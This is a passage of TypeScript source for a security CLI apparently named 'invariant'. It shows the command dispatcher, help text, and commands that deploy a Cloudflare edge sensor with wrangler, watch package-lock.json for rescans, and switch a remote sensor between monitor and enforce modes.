    console.log(`\n  Coverage: ${detected}/${attackPayloads.length} (${((detected / attackPayloads.length) * 100).toFixed(0)}%)`)
    console.log('')
}

// ── Main ─────────────────────────────────────────────────────────

async function main(): Promise<void> {
    const args = process.argv.slice(2)
    const command = args[0] ?? 'init'
    const projectDir = process.cwd()

    switch (command) {
        case 'init':
        case 'setup':
            await commandInit(projectDir)
            break
        case 'scan':
            logo()
            await commandScan(projectDir)
            break
        case 'codescan':
            logo()
            await commandCodeScan(projectDir, args.slice(1))
            break
        case 'fix':
            logo()
            await commandFix(projectDir)
            break
        case 'revert':
            logo()
            await commandRevert(projectDir, args[1])
            break
        case 'dashboard':
        case 'ui':
            logo()
            await commandDashboard(projectDir)
            break
        case 'status':
            logo()
            await commandStatus(projectDir)
            break
        case 'config':
            logo()
            await commandConfig(projectDir)
            break
        case 'keys':
        case 'keypair':
        case 'enroll':
            logo()
            await commandKeypair(projectDir)
            break
        case 'deploy':
            logo()
            await commandDeploy(projectDir)
            break
        case 'watch':
            logo()
            await commandWatch(projectDir)
            break
        case 'mode':
            logo()
            await commandMode(args)
            break
        case 'hooks':
            logo()
            commandHooks(projectDir)
            break
        case 'analyze':
        case 'detect':
        case 'test':
            await commandAnalyze(args)
            break
        case 'benchmark':
        case 'bench':
            logo()
            commandBenchmark()
            break
        case 'version':
        case '--version':
        case '-v':
            console.log(`invariant v${VERSION}`)
            break
        case 'help':
        case '--help':
        case '-h':
            logo()
            console.log('  Commands:')
            console.log('    init        Interactive setup (default)')
            console.log('    scan        Scan dependencies + configuration')
            console.log('    codescan    Scan source code for sink pattern vulnerabilities')
            console.log('    fix         Auto-fix vulnerable sink patterns and create atomic git commit')
            console.log('    revert      Revert a fix commit by hash')
            console.log('    analyze     Analyze a single input through the full detection pipeline')
            console.log('    benchmark   Run detection engine benchmarks')
            console.log('    dashboard   Open localhost dashboard')
            console.log('    status      Show current posture')
            console.log('    config      Show current config from invariant.db')
            console.log('    keys        Generate subscriber X25519 keypair (collective intel enrollment)')
            console.log('    deploy      Deploy edge sensor to Cloudflare')
            console.log('    watch       Continuous monitoring with periodic rescans')
            console.log('    mode <monitor|enforce> <sensor-url> <introspection-key>')
            console.log('                Remotely switch sensor mode')
            console.log('    hooks       Install Git pre-commit hook for staged-file code scanning')
            console.log('    help        Show this help')
            console.log('')
            break
        default:
            console.error(`  Unknown command: ${command}`)
            console.log('  Run `npx @santh/invariant help` for available commands.')
            process.exit(1)
    }
}

// ── Deploy Command ───────────────────────────────────────────────

async function commandDeploy(projectDir: string): Promise<void> {
    console.log('  Edge Sensor Deployment')
    console.log('  ═══════════════════════════════════════════════\n')

    // Check for wrangler using spawn (secure)
    let hasWrangler = false
    try {
        await new Promise<void>((resolve, reject) => {
            const child = spawn('npx', ['wrangler', '--version'], {
                stdio: 'pipe',
                shell: false,
            })
            child.on('close', code => code === 0 ? resolve() : reject())
            child.on('error', reject)
        })
        hasWrangler = true
    } catch { /* not installed */ }

    if (!hasWrangler) {
        console.log('  wrangler is required to deploy edge sensors.')
        console.log('  Install it: npm install -g wrangler')
        console.log('  Then run: wrangler login')
        return
    }

    // Check for wrangler auth
    try {
        await new Promise<void>((resolve, reject) => {
            const child = spawn('npx', ['wrangler', 'whoami'], {
                stdio: 'pipe',
                shell: false,
            })
            child.on('close', code => code === 0 ? resolve() : reject())
            child.on('error', reject)
        })
    } catch {
        console.log('  Not authenticated with Cloudflare.')
        console.log('  Run: wrangler login')
        return
    }

    // Get and validate inputs
    const modeInput = await ask('Defense mode? [monitor/enforce] (monitor):') || 'monitor'
    const mode = validateMode(modeInput)
    
    const ingestUrlInput = await ask('Signal ingest URL (leave blank for local-only):') || ''
    const ingestUrl = validateIngestUrl(ingestUrlInput)

    console.log('\n  Deploying edge sensor...\n')

    try {
        // Determine deploy directory
        const sensorDir = join(projectDir, 'node_modules', '@santh', 'edge-sensor')
        const altSensorDir = join(projectDir, '..', 'packages', 'edge-sensor')

        let deployDir: string
        if (existsSync(sensorDir)) {
            deployDir = sensorDir
        } else if (existsSync(altSensorDir)) {
            deployDir = altSensorDir
        } else {
            console.log('  Edge sensor package not found.')
            console.log('  Ensure @santh/edge-sensor is installed or run from the monorepo.')
            return
        }

        // Validate deployDir
        deployDir = validatePath(deployDir, projectDir)

        // Read category from invariant.config.json if it exists
        let category = 'saas'
        const configFilePath = join(projectDir, 'invariant.config.json')
        if (existsSync(configFilePath)) {
            try {
                const configData = JSON.parse(readFileSync(configFilePath, 'utf-8'))
                if (configData.category) category = configData.category
            } catch { /* ignore parse errors */ }
        }

        // Build arguments array (secure, no shell injection)
        const wranglerArgs = [
            'wrangler', 'deploy',
            '--var', `DEFENSE_MODE:${mode}`,
            '--var', 'SIGNAL_BATCH_SIZE:50',
            '--var', `INVARIANT_CATEGORY:${category}`,
        ]

        if (ingestUrl) {
            wranglerArgs.push('--var', `SANTH_INGEST_URL:${ingestUrl}`)
        }

        // Execute with spawn (no shell)
        await new Promise<void>((resolve, reject) => {
            const child = spawn('npx', wranglerArgs, {
                cwd: deployDir,
                stdio: 'inherit',
                shell: false,  // CRITICAL: No shell interpretation
            })
            
            child.on('close', code => {
                if (code === 0) {
                    resolve()
                } else {
                    reject(new Error(`wrangler deploy exited with code ${code}`))
                }
            })
            
            child.on('error', reject)
        })

        console.log('\n  ✓ Edge sensor deployed successfully!')
        console.log(`  Mode: ${mode}`)
        if (ingestUrl) console.log(`  Ingest: ${ingestUrl}`)
        console.log('')
    } catch (err) {
        console.error('  Deployment failed:', err instanceof Error ? err.message : err)
    }
}

// ── Watch Command ────────────────────────────────────────────────

async function commandWatch(projectDir: string): Promise<void> {
    console.log('  Continuous monitoring active')
    console.log('  ─────────────────────────────────────────────\n')

    const agent = new InvariantAgent({
        projectDir,
        mode: 'observe',
        scanOnStart: true,
        auditOnStart: true,
        rescanInterval: 1, // Rescan every hour
        verbose: true,
    })

    await agent.start()

    const status = agent.getStatus()
    console.log(`\n  Initial scan complete: ${status.findings.total} findings`)
    console.log('  Watching for changes... (Ctrl+C to stop)\n')

    // Watch for package-lock.json changes
    const { watch } = await import('node:fs')
    const lockPath = join(projectDir, 'package-lock.json')
    let watcher: ReturnType<typeof watch> | null = null
    
    if (existsSync(lockPath)) {
        watcher = watch(lockPath, async () => {
            console.log('  [invariant] package-lock.json changed — rescanning...')
            try {
                const result = await agent.rescan()
                console.log(`  [invariant] Rescan: ${result.totalDeps} packages, ${result.vulnerabilities.length} vulnerabilities`)
            } catch (err) {
                console.log(`  [invariant] Rescan failed: ${err}`)
            }
        })

        process.on('SIGINT', () => {
            if (watcher) watcher.close()
            agent.stop()
            console.log('\n  Monitoring stopped.')
            process.exit(0)
        })
    } else {
        process.on('SIGINT', () => {
            agent.stop()
            console.log('\n  Monitoring stopped.')
            process.exit(0)
        })
    }

    // Keep process alive
    await new Promise(() => { }) // eslint-disable-line @typescript-eslint/no-empty-function
}

async function commandMode(args: string[]): Promise<void> {
    const modeInput = args[1]
    const sensorUrlInput = args[2]
    const keyInput = args[3] ?? process.env.INTROSPECTION_KEY

    if (!modeInput || !sensorUrlInput || !keyInput) {
        console.error('  Usage: npx @santh/invariant mode <monitor|enforce> <sensor-url> <introspection-key>')
        console.error('  Also accepts INTROSPECTION_KEY from environment if omitted.')
        return
    }

    let mode: 'monitor' | 'enforce'
    let sensorUrl: string
    try {
        mode = validateMode(modeInput)
        sensorUrl = validateUrl(sensorUrlInput)
    } catch (error) {
        console.error(`  Invalid input: ${error instanceof Error ? error.message : error}`)
        return
    }

    const endpoint = `${sensorUrl.replace(/\/$/, '')}/__invariant/config`

    try {
        const response = await fetch(endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Introspection-Key': sanitizeEnvValue(keyInput),
            },
            body: JSON.stringify({ mode }),
        })

        if (!response.ok) {
            const errorText = await response.text()
            console.error(`  Failed to set mode: ${response.status} ${response.statusText}`)
            if (errorText) console.error(`  ${errorText}`)
            return
        }

        const payload = await response.json().catch(() => null) as Record<string, unknown> | null
        const updatedMode = typeof payload?.mode === 'string' ? payload.mode : mode
        console.log(`  ✓ Sensor mode updated to ${updatedMode}`)
    } catch (error) {
        console.error('  Failed to contact sensor:', error instanceof Error ? error.message : error)
    }
}

main().catch(err => {
    console.error('  Error:', err.message ?? err)
    process.exit(1)
})
